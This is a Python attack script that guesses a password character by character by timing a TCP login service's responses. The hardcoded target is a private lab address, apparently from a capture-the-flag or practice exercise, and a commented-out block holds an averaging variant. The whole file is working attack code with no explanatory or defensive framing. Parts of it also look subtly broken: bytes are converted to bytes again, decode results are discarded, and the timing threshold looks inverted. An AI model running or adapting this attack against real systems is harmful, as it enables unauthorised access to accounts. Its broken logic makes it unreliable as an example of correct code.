#! /usr/bin/env python

import socket
import time
import string
import numpy
import sys

target = '192.168.56.101'
port = 54311

def main():
	print("[*] Running timing attack.....")
	pw = crack_pw()
	print("[*] Password found!! {}".format(pw))
	

def check_login_response(prompt):
	print(prompt)
	if ("Invalid Password!" in prompt):
		return False
	return True


def crack_pw():

	password = ''
	done = False
	charList = string.ascii_letters + string.digits + string.punctuation
	# print(charList)
	
	
	while not done: 
		for char in charList:
			# connection basics, establishment
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((target,port))
			
			prompt = s.recv(1024)
			print(prompt)
			prompt = s.recv(1024)
			print(prompt)
			password = bytes(password, encoding="UTF-8")
			char = bytes(char, encoding="UTF-8")
			s.send(password + char)
			t0 = time.time()
			prompt = s.recv(1024)
			print(prompt)
			t1 = time.time()
			diff = t1 - t0
			if (diff < 0.0005):
				# password = str(password, encoding="UTF-8")
				password.decode("UTF-8")
				# char = str(password, encoding="UTF-8")
				char.decode("UTF-8")
				print("{} {} {}".format(password, char, diff))
				password += char
				prompt.decode("UTF-8")
				done = check_login_response(prompt)
				if (done):
					break
					
			s.close()
					
	return password


if __name__ == '__main__':
	main()

# iterate through all possible combos
# for n in range(0, 62):
# 
# 	for char in (string.ascii_letters + string.digits + string.punctuation):
# 	
# 		t0 = time.time()
# 		s.send(password + char + '\n')
# 		prompt = s.recv(512)
# 		t1 = time.time()
# 
# 		t2 = time.time()
# 		s.send(password + char + '\n')
# 		prompt = s.recv(512)
# 		t3 = time.time()
# 
# 		t4 = time.time()
# 		s.send(password + char + '\n')
# 		prompt = s.recv(512)
# 		t5 = time.time()
# 
# 		t6 = time.time()
# 		s.send(password + char + '\n')
# 		prompt = s.recv(512)
# 		t7 = time.time()
# 
# 		times = [(t7-t6), (t5-t4), (t3-t2), (t1-t0)]
# 		average = numpy.mean(times)
# 	
# 		# for every quick return, add that char to password
# 		if average < 0.002: 
# 			password = password + char 
# 			sys.stdout.write('\r' + password)
# 			sys.stdout.flush()
# 			break
# 		print(char + ": " + str(average))

